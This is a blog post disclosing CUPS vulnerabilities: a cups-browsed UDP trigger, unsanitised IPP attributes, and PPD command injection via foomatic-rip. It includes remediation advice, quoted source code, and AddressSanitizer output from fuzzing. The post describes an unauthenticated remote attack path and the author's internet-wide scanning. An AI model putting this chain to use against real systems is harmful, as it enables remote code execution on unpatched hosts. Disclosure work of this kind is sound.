<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Attacking UNIX Systems via CUPS, Part I | evilsocket</title>
<meta name="description" content="">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Attacking UNIX Systems via CUPS, Part I">
<meta property="og:description" content="">
<meta property="og:url" content="/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2024/cups1/smart.jpg">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Attacking UNIX Systems via CUPS, Part I">
<meta name="twitter:description" content="">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/"},"headline":"Attacking UNIX Systems via CUPS, Part I","description":"","image":"https://www.evilsocket.net/images/2024/cups1/smart.jpg","datePublished":"2024-09-26T14:51:30.000Z","dateModified":"2025-12-21T11:52:45.998Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher and open-source developer","url":"https://www.evilsocket.net","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/"],"jobTitle":"Security Researcher","worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"linux security, exploit, cve, cups, cups-browsed, printer, printing, unix, hacking, rce, disclosure, ipp, zeroconf, udp, responsible disclosure, vulnerability research, print services, unauthenticated access, CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, CVE-2024-47177","articleSection":"Technology","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <div class="site-title-group">
          <span class="site-title">evilsocket</span>
          <span class="site-motto">Preoccupied with a single leaf, you won't see the tree. Preoccupied with a single tree... you'll miss the entire forest.</span>
        </div>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">Attacking UNIX Systems via CUPS, Part I</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      ‚Äî <time datetime="2024-09-26T14:51:30.000Z">26 Sep 2024</time>
      
        ‚Äî <a href="/tags/linux-security/" class="post-category">linux security</a>, <a href="/tags/exploit/" class="post-category">exploit</a>, <a href="/tags/cve/" class="post-category">cve</a>, <a href="/tags/cups/" class="post-category">cups</a>, <a href="/tags/cups-browsed/" class="post-category">cups-browsed</a>, <a href="/tags/printer/" class="post-category">printer</a>, <a href="/tags/printing/" class="post-category">printing</a>, <a href="/tags/unix/" class="post-category">unix</a>, <a href="/tags/hacking/" class="post-category">hacking</a>, <a href="/tags/rce/" class="post-category">rce</a>, <a href="/tags/disclosure/" class="post-category">disclosure</a>, <a href="/tags/ipp/" class="post-category">ipp</a>, <a href="/tags/zeroconf/" class="post-category">zeroconf</a>, <a href="/tags/udp/" class="post-category">udp</a>, <a href="/tags/responsible-disclosure/" class="post-category">responsible disclosure</a>, <a href="/tags/vulnerability-research/" class="post-category">vulnerability research</a>, <a href="/tags/print-services/" class="post-category">print services</a>, <a href="/tags/unauthenticated-access/" class="post-category">unauthenticated access</a>, <a href="/tags/CVE-2024-47176/" class="post-category">CVE-2024-47176</a>, <a href="/tags/CVE-2024-47076/" class="post-category">CVE-2024-47076</a>, <a href="/tags/CVE-2024-47175/" class="post-category">CVE-2024-47175</a>, <a href="/tags/CVE-2024-47177/" class="post-category">CVE-2024-47177</a>
      
    </div>
    <br/>
    <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false">Follow me on X</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
  </header>

  <div class="post-content">
    <p>Hello friends, this is the first of two, possibly three (if and when I have time to finish the Windows research) writeups. We will start with targeting GNU/Linux systems with an RCE. As someone who‚Äôs directly involved in the CUPS project said:</p>
<blockquote>
<p>From a generic security point of view, a whole Linux system as it is nowadays is just an endless and hopeless mess of security holes waiting to be exploited.</p>
</blockquote>
<p>Well they‚Äôre not wrong!</p>
<p>While this is <a target="_blank" rel="noopener" href="https://www.huawei.com/en/psirt/security-advisories/hw-425408">not</a> the <a href="https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/">first</a> time <a href="https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/">I try</a> to more or less responsibly report a vulnerability, it is definitely the weirdest and most frustrating time as some of you might have noticed from my socials, and it is also the last time. More on this later, but first.</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li>CVE-2024-47176 | <strong>cups-browsed</strong> &lt;= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a <code>Get-Printer-Attributes</code> IPP request to an attacker controlled URL.</li>
<li>CVE-2024-47076 | <strong>libcupsfilters</strong> &lt;= 2.1b1 <code>cfGetPrinterAttributes5</code> does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.</li>
<li>CVE-2024-47175 | <strong>libppd</strong> &lt;= 2.1b1 <code>ppdCreatePPDFromIPP2</code> does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.</li>
<li>CVE-2024-47177 | <strong>cups-filters</strong> &lt;= 2.0.1 <code>foomatic-rip</code> allows arbitrary command execution via the <code>FoomaticRIPCommandLine</code> PPD parameter.</li>
</ul>
<p>(can you already see where this is going? :D)</p>
<p>Plus a couple of other bugs that will be mentioned and that are arguably security issues but have been pretty much ignored during the conversation with the developers and the CERT. They are still there, along with several other bugs that are more or less exploitable.</p>
<h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>A remote unauthenticated attacker can silently replace existing printers‚Äô (or install new ones) IPP urls with a malicious one, resulting in arbitrary command execution (on the computer) when a print job is started (from that computer).</p>
<h3 id="Entry-Points"><a href="#Entry-Points" class="headerlink" title="Entry Points"></a>Entry Points</h3><ul>
<li><strong>WAN / public internet</strong>: a remote attacker sends an <strong>UDP</strong> packet to port <strong>631</strong>. No authentication whatsoever.</li>
<li>LAN: a local attacker can spoof zeroconf / mDNS / DNS-SD advertisements (we will talk more about this in the next writeup Ô£ø) and achieve the same code path leading to RCE.</li>
</ul>
<p>Quoting one of the first comments from the guy who literally wrote the book about CUPS, while trying to explain to me why this is not that bad:</p>
<blockquote>
<p>I am just pointing out that the public Internet attack is limited to servers that are directly connected to the Internet</p>
</blockquote>
<p><img src="/images/2024/cups1/smart.jpg" alt="smart"></p>
<h3 id="Affected-Systems"><a href="#Affected-Systems" class="headerlink" title="Affected Systems"></a>Affected Systems</h3><p>CUPS and specifically cups-browsed are packaged for most UNIX systems:</p>
<ul>
<li>most <a target="_blank" rel="noopener" href="https://pkgs.org/download/cups-browsed">GNU/Linux distributions</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.freebsd.org/en/articles/cups/">some</a> BSDs.</li>
<li>Google <a target="_blank" rel="noopener" href="https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/chromiumos-overlay/net-print/;bpv=1">Chromium / ChromeOS</a> ‚Ä¶ <a target="_blank" rel="noopener" href="https://issuetracker.google.com/issues/172222838">maybe?</a></li>
<li>Oracle <a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E23824_01/html/821-1451/cups-intro.html">Solaris</a></li>
<li>Possibly more?</li>
</ul>
<p>This thing is packaged for anything, in some cases it‚Äôs enabled by default, in others it‚Äôs not, go figure ü§∑. Full disclosure, I‚Äôve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. And I‚Äôve got back connections from <strong>hundreds of thousands</strong> of devices, with <a target="_blank" rel="noopener" href="https://x.com/evilsocket/status/1833878573289025664">peaks of 200-300K concurrent clients</a>. <a target="_blank" rel="noopener" href="https://pastebin.com/7zzFzxCN">This file</a> contains a list of the unique Linux systems affected. Note that everything that is not Linux has been filtered out. That is why I was getting increasingly alarmed during the last few weeks.</p>
<h3 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h3><ul>
<li>Disable and remove the <code>cups-browsed</code> service if you don‚Äôt need it (and probably you don‚Äôt).</li>
<li>Update the CUPS package on your systems. </li>
<li>In case your system can‚Äôt be updated and for some reason you rely on this service, block all traffic to UDP port 631 and possibly all DNS-SD traffic (good luck if you use zeroconf).</li>
</ul>
<p><strong>Entirely personal recommendation, take it or leave it:</strong> I‚Äôve seen and attacked enough of this codebase to remove any CUPS service, binary and library from any of my systems and never again use a UNIX system to print. I‚Äôm also removing every zeroconf / avahi / bonjour listener. You might consider doing the same.</p>
<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>One lazy day a few weeks ago, I was configuring Ubuntu on a new laptop (GPD Pocket 3, amazing little hacking machine btw) and for reasons that are irrelevant to this post I wanted to check which services were listening on UDP ports - so I type <code>netstat -anu</code> in a terminal and after checking the output, I notice something interesting:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State </span><br><span class="line">...</span><br><span class="line">udp        0      0 0.0.0.0:631             0.0.0.0:*</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>The <code>0.0.0.0</code> part is especially unusual, it means that whatever process is listening on port 631, it is listening on and responding to any network interface: LAN, WAN, VPN, whatever you have. I also vaguely recalled that <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/CUPS">CUPS, the Common Unix Printing System</a>, uses TCP port 631, but this is UDP. I investigated with a <code>lsof -i :631</code>, that confirmed CUPS on 631 tcp plus this other process, <code>cups-browsed</code> (likely related to CUPS), using the udp port instead:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cupsd     1868642 root    6u  IPv6 32034095      0t0  TCP ip6-localhost:ipp (LISTEN)</span><br><span class="line">cupsd     1868642 root    8u  IPv4 32034096      0t0  TCP localhost:ipp (LISTEN)</span><br><span class="line">cups-brow 1868652 root    7u  IPv4 32024370      0t0  UDP *:631 </span><br></pre></td></tr></table></figure>

<p>And <code>ps aux | grep &quot;cups-brow&quot;</code> ultimately confirmed that this process runs as root:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root     1868652  0.0  0.0 172692 11196 ?        Ssl  13:20   0:00 &#x2F;usr&#x2F;sbin&#x2F;cups-browsed</span><br></pre></td></tr></table></figure>

<h2 id="What-is-cups-browsed"><a href="#What-is-cups-browsed" class="headerlink" title="What is cups-browsed?"></a>What is cups-browsed?</h2><p>After some googling I found out that <code>cups-browsed</code> is indeed part of the CUPS system and it is responsible for discovering new printers and <strong>automatically adding them to the system</strong>. Very interesting, I had no idea Linux just added anything found on a network before the user can even accept or be notified. The more you know!</p>
<p>At this point I was extremely intrigued and curious, so I start digging into the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed">source code of this service</a>. While it‚Äôs pretty messy on one hand, it is also self contained and relatively easy to understand. So I quickly search for <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/bind.2.html">bind API</a> usage and <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L13995">confirm</a> that this thing is indeed listening on INADDR_ANY:631 UDP:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line"><span class="built_in">memset</span> (&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span> (addr));</span><br><span class="line">addr.sin_addr.s_addr = htonl (INADDR_ANY);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons (BrowsePort);</span><br><span class="line"><span class="keyword">if</span> (bind (browsesocket, (struct sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (addr)))</span><br><span class="line">&#123;</span><br><span class="line">    debug_printf(<span class="string">&quot;failed to bind CUPS Browsing socket: %s\n&quot;</span>,</span><br><span class="line">        strerror (errno));</span><br><span class="line">    close (browsesocket);</span><br><span class="line">    browsesocket = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Cool, this code is using global variables like there‚Äôs no tomorrow, so searching for the <code>browsesocket</code> <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11819">revealed</a> that the <code>process_browse_data</code> function is reading a packet from it, performing some checks and then some parsing:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">got = recvfrom (browsesocket, packet, <span class="keyword">sizeof</span> (packet) - <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">        &amp;srcaddr.addr, &amp;srclen);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... error checking removed for brevity ...</span></span><br><span class="line"></span><br><span class="line">packet[got] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">httpAddrString (&amp;srcaddr, remote_host, <span class="keyword">sizeof</span> (remote_host) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check this packet is allowed</span></span><br><span class="line"><span class="keyword">if</span> (!allowed ((struct sockaddr *) &amp;srcaddr))</span><br><span class="line">&#123;</span><br><span class="line">    debug_printf(<span class="string">&quot;browse packet from %s disallowed\n&quot;</span>,</span><br><span class="line">            remote_host);</span><br><span class="line">    <span class="keyword">return</span> (TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// debug loggig removed for brevity</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">sscanf</span> (packet, <span class="string">&quot;%x%x%1023s&quot;</span>, &amp;type, &amp;state, uri) &lt; <span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>Essentially, this service expects an UDP packet with the format <code>HEX_NUMBER HEX_NUMBER TEXT_DATA</code> and, if the <code>allowed</code> function returns true for the specific source IP, more things happen later. </p>
<p><img src="/images/2024/cups1/right.jpg" alt="right?!"></p>
<p>Well it turns out that while you <em>could</em> configure who can and who can‚Äôt connect by editing the <code>/etc/cups/cups-browsed.conf</code> configuration file ‚Ä¶ the default configuration file, on pretty much any system, is entirely commented out and simply allows anyone.</p>
<p>Great ü§¶</p>
<p>Later in the code, some <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11857">pointer operations are performed to parse the packet</a>. If all checks pass, two text fields parsed from the packet are passed to the <code>found_cups_printer</code> function. We‚Äôll return to this function in a moment, but for now let‚Äôs focus on the parsing.</p>
<h2 id="Stack-Buffer-Overflows-and-Race-Conditions"><a href="#Stack-Buffer-Overflows-and-Race-Conditions" class="headerlink" title="Stack Buffer Overflows and Race Conditions"></a>Stack Buffer Overflows and Race Conditions</h2><p>Keep in mind that while the <code>CUPS</code> package itself <a target="_blank" rel="noopener" href="https://github.com/google/oss-fuzz/tree/master/projects/cups">is covered in oss-fuzz</a> (barely to be honest ‚Ä¶), <strong>cups-browsed is not</strong>; there seems to be no fuzzing coverage for this component. And I don‚Äôt know about you, but to me this parsing routine looks fishy and definitely something worth fuzzing:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">end = packet + <span class="keyword">sizeof</span>(packet);</span><br><span class="line">c = <span class="built_in">strchr</span> (packet, <span class="string">&#x27;\&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (c &gt;= end)</span><br><span class="line">    <span class="keyword">return</span> (TRUE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Extract location field</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        c++;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>;</span><br><span class="line">             i &lt; <span class="keyword">sizeof</span> (location) - <span class="number">1</span> &amp;&amp; *c != <span class="string">&#x27;\&quot;&#x27;</span> &amp;&amp; c &lt; end;</span><br><span class="line">             i++, c++)</span><br><span class="line">                location[i] = *c;</span><br><span class="line">        location[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        debug_printf(<span class="string">&quot;process_browse_data: location: |%s|\n&quot;</span>, location); <span class="comment">// !!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; c &lt; end &amp;&amp; *c != <span class="string">&#x27;\&quot;&#x27;</span>; c++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c &gt;= end)</span><br><span class="line">        <span class="keyword">return</span> (TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*c == <span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> (c++; c &lt; end &amp;&amp; <span class="built_in">isspace</span>(*c); c++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c &gt;= end)</span><br><span class="line">        <span class="keyword">return</span> (TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is there an info field?</span></span><br><span class="line">    <span class="keyword">if</span> (*c == <span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        c++;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>;</span><br><span class="line">             i &lt; <span class="keyword">sizeof</span> (info) - <span class="number">1</span> &amp;&amp; *c != <span class="string">&#x27;\&quot;&#x27;</span> &amp;&amp; c &lt; end;</span><br><span class="line">             i++, c++)</span><br><span class="line">            info[i] = *c;</span><br><span class="line">        info[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        debug_printf(<span class="string">&quot;process_browse_data: info: |%s|\n&quot;</span>, info); <span class="comment">// !!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c &gt;= end)</span><br><span class="line">    <span class="keyword">return</span> (TRUE);</span><br></pre></td></tr></table></figure>

<p>So I quickly put together a fuzzing target around <code>process_browse_data</code>, start my <a href="https://www.evilsocket.net/2015/04/30/Fuzzing-with-AFL-Fuzz-a-Practical-Example-AFL-vs-binutils/">good old friend AFL</a>, and wait. <strong>You won‚Äôt believe what happens next!!!</strong></p>
<p><img src="/images/2024/cups1/afl.png" alt="crash"></p>
<p>There are 5 different fuzzing inputs that trigger this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">process_browse_data() in THREAD 136077340691200</span><br><span class="line">got&#x3D; 1135</span><br><span class="line">httpAddrGetString(addr&#x3D;0x7bc2f7f098a0, s&#x3D;0x7bc2f7f09a00, slen&#x3D;255)</span><br><span class="line">1httpAddrGetString: returning &quot;UNKNOWN&quot;...</span><br><span class="line">browse packet received from UNKNOWN</span><br><span class="line">process_browse_data: location: |IIIIIIII???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????@???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????|</span><br><span class="line">---</span><br><span class="line">&#x3D;&#x3D;28780&#x3D;&#x3D;ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7bc2f7f09820 at pc 0x58293fb0926b bp 0x7fffa0308490 sp 0x7fffa0308488</span><br><span class="line">READ of size 1 at 0x7bc2f7f09820 thread T0</span><br><span class="line">    #0 0x58293fb0926a in process_browse_data(char const*) &#x2F;home&#x2F;evilsocket&#x2F;lab&#x2F;cups-fuzz&#x2F;process_browse_data&#x2F;main.cpp:264:42</span><br><span class="line">    #1 0x58293fb093d6 in main &#x2F;home&#x2F;evilsocket&#x2F;lab&#x2F;cups-fuzz&#x2F;process_browse_data&#x2F;main.cpp:292:9</span><br><span class="line">    #2 0x7bc2fa42a1c9 in __libc_start_call_main csu&#x2F;..&#x2F;sysdeps&#x2F;nptl&#x2F;libc_start_call_main.h:58:16</span><br><span class="line">    #3 0x7bc2fa42a28a in __libc_start_main csu&#x2F;..&#x2F;csu&#x2F;libc-start.c:360:3</span><br><span class="line">    #4 0x58293fa293e4 in _start (&#x2F;home&#x2F;evilsocket&#x2F;lab&#x2F;cups-fuzz&#x2F;process_browse_data&#x2F;fuzz-target+0x2d3e4) (BuildId: a6df1903658bcb123c38a4a928f80e2a81b617e1)</span><br><span class="line"></span><br><span class="line">Address 0x7bc2f7f09820 is located in stack of thread T0 at offset 2080 in frame</span><br><span class="line">    #0 0x58293fb08557 in process_browse_data(char const*) &#x2F;home&#x2F;evilsocket&#x2F;lab&#x2F;cups-fuzz&#x2F;process_browse_data&#x2F;main.cpp:164</span><br><span class="line"></span><br><span class="line">  This frame has 8 object(s):</span><br><span class="line">    [32, 2080) &#39;packet&#39; (line 165) &lt;&#x3D;&#x3D; Memory access at offset 2080 overflows this variable</span><br><span class="line">    [2208, 2464) &#39;srcaddr&#39; (line 166)</span><br><span class="line">    [2528, 2532) &#39;type&#39; (line 169)</span><br><span class="line">    [2544, 2548) &#39;state&#39; (line 170)</span><br><span class="line">    [2560, 2816) &#39;remote_host&#39; (line 171)</span><br><span class="line">    [2880, 3904) &#39;uri&#39; (line 172)</span><br><span class="line">    [4032, 5056) &#39;location&#39; (line 173)</span><br><span class="line">    [5184, 6208) &#39;info&#39; (line 174)</span><br><span class="line">HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork</span><br><span class="line">      (longjmp and C++ exceptions *are* supported)</span><br><span class="line">SUMMARY: AddressSanitizer: stack-buffer-overflow &#x2F;home&#x2F;evilsocket&#x2F;lab&#x2F;cups-fuzz&#x2F;process_browse_data&#x2F;main.cpp:264:42 in process_browse_data(char const*)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x7bc2f7f09580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">&#x3D;&gt;0x7bc2f7f09800: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2</span><br><span class="line">  0x7bc2f7f09880: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09980: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 04 f2 04 f2</span><br><span class="line">  0x7bc2f7f09a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x7bc2f7f09a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">&#x3D;&#x3D;28780&#x3D;&#x3D;ABORTING</span><br></pre></td></tr></table></figure>

<p>I believe it being due to the pointer being dereferenced before the exit condition is verified, in both loops. I also found out later on that there‚Äôs a race condition and possibly DoS in the <a target="_blank" rel="noopener" href="https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11764">lock acquired here</a>.</p>
